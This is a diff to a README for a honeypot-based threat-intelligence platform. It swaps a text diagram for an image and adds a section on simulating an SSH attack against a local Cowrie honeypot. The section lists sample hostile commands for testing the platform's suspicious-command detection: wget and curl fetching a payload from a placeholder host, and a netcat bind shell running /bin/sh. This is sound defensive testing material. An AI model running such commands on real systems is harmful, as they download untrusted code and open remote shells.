@@ -19,23 +19,7 @@ The platform is composed of the following components:
 *   **Sentinel API:** A Python-based FastAPI application that provides a REST API for accessing the processed threat intelligence.
 *   **Sentinel Processor:** A background task that runs within the Sentinel API application and continuously processes new events from Elasticsearch.
  
-```
-+-----------------+      +-----------------+      +-----------------+
-|                 |      |                 |      |                 |
-| Cowrie Honeypot |----->|    Filebeat     |----->|  Elasticsearch  |
-|                 |      |                 |      |                 |
-+-----------------+      +-----------------+      +-----------------+
-                                                     ^
-                                                     |
-                                                     | (Read/Write)
-                                                     |
-                                                     v
-+-----------------+      +-----------------+      +-----------------+
-|                 |      |                 |      |                 |
-|   Sentinel API  |<-----| Sentinel Processor|<----|     Kibana      |
-|                 |      |                 |      |                 |
-+-----------------+      +-----------------+      +-----------------+
-```
+![Architecture Diagram](assets/architecture.png)
  
 ## 3. Core Features
  
@@ -102,7 +86,37 @@ The API is available at `http://localhost:8000` and requires an `X-API-KEY` head
    - `ELASTICSEARCH_VERIFY_CERTS=true` and (if needed) `ELASTICSEARCH_CA_CERTS=/app/certs/ca.crt`
   Filebeat and the app will use these automatically.
  
-## 8. Contributing
+## 8. Testing and Simulation
+ 
+Once the stack is running, you can simulate an attack to generate data and test the system. The Cowrie honeypot is listening on ports `2222` (SSH) and `2323` (Telnet) on your local machine.
+ 
+### Simulating an SSH Attack
+ 
+1.  **Open a new terminal or PowerShell window.**
+2.  **Connect to the honeypot using an SSH client:**
+    ```bash
+    ssh root@localhost -p 2222
+    ```
+3.  **You will be prompted for a password.** You can enter any password; the honeypot will accept it.
+4.  **Execute some commands.** The honeypot will log any commands you execute. Here are some examples that will trigger the suspicious command detection:
+    ```bash
+    wget http://example.com/malware.sh
+    curl http://example.com/payload.bin -o /tmp/payload
+    nc -l -p 1234 -e /bin/sh
+    ```
+5.  **Exit the session:**
+    ```bash
+    exit
+    ```
+ 
+### Viewing the Results
+ 
+1.  **Open Kibana:** `http://localhost:5601`
+2.  **Navigate to the Discover tab.**
+3.  **Select the `filebeat-*` data view** to see the raw logs from the honeypot.
+4.  **Select the `sentinel-events` data view** to see the processed and scored events. You should see the events from your simulated attack, along with their risk scores and the factors that contributed to the score.
+ 
+## 9. Contributing
  
 Contributions are welcome! Please feel free to submit a pull request or open an issue on the GitHub repository.
  
